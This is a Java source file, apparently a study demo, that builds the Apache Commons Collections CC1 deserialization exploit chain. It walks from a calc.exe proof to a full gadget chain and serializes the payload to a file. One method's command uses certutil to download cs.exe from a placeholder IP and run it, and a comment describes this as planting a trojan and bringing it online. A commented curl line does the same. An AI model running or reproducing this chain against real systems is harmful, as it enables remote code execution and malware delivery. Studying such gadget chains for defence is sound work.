package demo.cc.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class ApacheCC1 {
    public static void main(String[] args) throws Exception {
        ApacheCC1 apacheCC1 = new ApacheCC1();
//        apacheCC1.test1();
//        apacheCC1.test2();
//        apacheCC1.test3();
        apacheCC1.unserialize();

    }
    //验证TnvokerTransformer能否正常反射运行Runtime
    public void test1() throws Exception {
        //原始方法，反射调用
//        Class clazz =Runtime.class;
//        Method getRuntime = clazz.getMethod("getRuntime",null);
//        Runtime runtime = (Runtime) getRuntime.invoke(clazz,null);
//        Method exec = clazz.getMethod("exec",String.class);
//        exec.invoke(runtime,"calc.exe");

        //在InvokerTransformer中调用transform
        Runtime runtime = Runtime.getRuntime();
        String methodName = "exec";
        Class[] paramTypes = new Class[] {String.class};
        Object[] args = new Object[]{"calc.exe"};
        InvokerTransformer invokerTransformer = new  InvokerTransformer(methodName,paramTypes,args);
        invokerTransformer.transform(runtime);
    }

    //在TransformeMap中进行调用checkSetValue方法
    public void test2() throws Exception{
        Runtime runtime = Runtime.getRuntime();
        String methodName = "exec";
        Class[] paramTypes = new Class[] {String.class};
        Object[] args = new Object[]{"calc.exe"};
        InvokerTransformer invokerTransformer = new  InvokerTransformer(methodName,paramTypes,args);


        Map map = new HashMap<>();
        map.put("key","vlaue");
        Transformer keyTransformer = null;
        Transformer valueTransformer = invokerTransformer;
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);
        //transformedMap 是由Map声明，所以不能直接调用checkSetValue，所以只能往上级找进入MapEntry进行调用

        //AnnotationInvocationHandler 不能被实例化，没有public构造方法
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Override.class,transformedMap);

        FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public void test3() throws Exception{
        //方法1
        //分开执行命令，下载cs.exe马到windows中，然后再执行上线
//        String command = "curl htttp://xx.xx.xx.xx/cs.exe -o D:\\cs.exe";
//        String command = "D:\\cs.exe";

        //方法2
        String command = "certutil.exe -urlcache -f  htttp://xx.xx.xx.xx/cs.exe -o D:\\cs.exe &D:\\cs.exe";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };
        ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
        //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。

        Map map=new HashMap();
        map.put("value","hello"); //这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断
        Map<Object,Object> transformedMap=TransformedMap.decorate(map,null,chainedTransformer);
        Class clazz=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj=constructor.newInstance(SuppressWarnings.class,transformedMap); //这里是问题二中第一个参数改注解为Target


        FileOutputStream fos = new FileOutputStream("./data/apachecc1.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }
    public void unserialize() throws Exception{
        FileInputStream fis = new FileInputStream("./data/cc1.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }


}
